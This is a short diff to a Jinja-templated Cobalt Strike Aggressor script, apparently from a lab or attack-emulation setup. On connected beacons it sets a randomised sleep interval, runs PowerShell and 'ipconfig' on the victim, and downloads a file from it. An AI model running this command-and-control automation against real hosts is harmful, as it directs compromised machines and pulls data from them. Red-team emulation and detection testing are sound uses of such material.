@@ -1,3 +1,5 @@
+{%- set heartbeat_min = attacker.cobaltstrike.listener.heartbeat.interval.min %}
+{%- set heartbeat_max = attacker.cobaltstrike.listener.heartbeat.interval.max %}
 on ready {
   println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
   println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing beacons: " . beacons() . "\n");
@@ -5,9 +7,9 @@ on ready {
     $victim = $vic['id'];
     println('Target beacon ID: ' . $victim);
     blog($victim, 'Start C2 scripts ...');
-    bsleep($victim, 17);
+    bsleep($victim, {{ range(heartbeat_min, heartbeat_max) | random }});
     bpowershell($victim, '$PSVersionTable');
     bshell($victim, 'ipconfig');
-    bdownload($victim, 'C:\\vagrant\\cobaltstrike-4.4.zip');
+    bdownload($victim, 'C:\\vagrant\\{{ dependencies.cs_installer }}');
   }
 }
